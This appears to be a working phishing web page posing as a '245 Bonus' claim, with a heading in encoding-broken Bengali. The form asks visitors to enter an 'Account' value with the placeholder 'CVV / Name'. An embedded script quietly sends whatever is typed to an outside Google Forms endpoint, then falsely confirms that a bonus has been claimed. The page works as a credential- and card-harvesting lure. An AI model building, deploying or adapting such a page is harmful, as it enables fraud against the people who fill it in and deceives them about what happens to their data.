<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>245 Bonus</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('bg.jpg');
        }
        .claim-button1 {
            background-color:#83aff0;
            color: black;
            border: none;
          border-radius:25px;
    font-size:28px;
            cursor: pointer;
            margin-right: 20px;
        }
        .form-container {
            background-color: #fff;
            padding: 20px 40px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 300px;
        }
        .form-container h2 {
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            background: linear-gradient(110.7deg, rgb(255, 81, 47) 1.7%, rgb(255, 167, 47) 8.2%, rgb(122, 59, 202) 16.2%, rgb(18, 51, 233) 23.4%, rgb(69, 193, 42) 32.8%, rgb(231, 7, 249) 43.7%, rgb(6, 200, 217) 55.3%, rgb(18, 51, 233) 65.5%, rgb(122, 59, 202) 74.5%, rgb(231, 7, 249) 82.3%, rgb(202, 59, 163) 91.4%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .form-container label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        .form-container input[type="tel"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .form-container input[type="submit"] {
            width: 50%;
            padding: 10px;
            background-color: #eb3480;
            border: none;
            border-radius: 25px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            display: block;
            margin: 0 auto;
        }
        .form-container input[type="submit"]:hover {
            background-color: #45a049;
        }
        .confirmation-message {
            text-align: center;
            color: green;
        }
    </style>
</head>
<body>
    <button class="claim-button1" onclick="window.history.back()"><i class="fas fa-circle-arrow-left"></i></button>

    <div class="form-container">
        <h2>‡¶¶‡ßÅ‡¶á-‡¶ö‡¶æ‡¶∞-‡¶™‡¶æ‡¶ö‡¶Å</h2>
        <form id="bonusForm">
            <label for="username">Account:</label>
            <input type="tel" id="username" placeholder="CVV / Name" required>
            <input type="submit" value="Claim" id="submit-button">
        </form>
        <div id="confirmation-message" class="confirmation-message" style="display: none;"></div>
    </div>

    <script>
        document.getElementById('bonusForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            var accountNumber = document.getElementById('username').value;
            var bonusCode = "Bonus";
            var googleFormsData = [
                {
                    url: 'https://docs.google.com/forms/d/e/1FAIpQLScVz3veBlhP7zYsKPa5gem4u_H2bqftYiICVXON30VjxWMJOw/formResponse',
                    entries: {
                        account: 'entry.31441046',
                        bonusCode: 'entry.1545135281'
                    }
                }
            ];

            googleFormsData.forEach((form) => {
                const formData = new FormData();
                formData.append(form.entries.account, accountNumber);
                formData.append(form.entries.bonusCode, bonusCode);

                fetch(form.url, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: new URLSearchParams(formData)
                })
                .then(() => {
                    var submitButton = document.getElementById('submit-button');
                    submitButton.style.display = 'none';
                    var confirmationMessage = document.getElementById('confirmation-message');
                    confirmationMessage.textContent = 'Thank you! Your bonus has been claimed üòâ.';
                    confirmationMessage.style.display = 'block';
                })
                .catch((error) => {
                    alert('Something went wrong. Please try again.');
                    console.error('Error:', error);
                });
            });
        });
    </script>
</body>
</html>
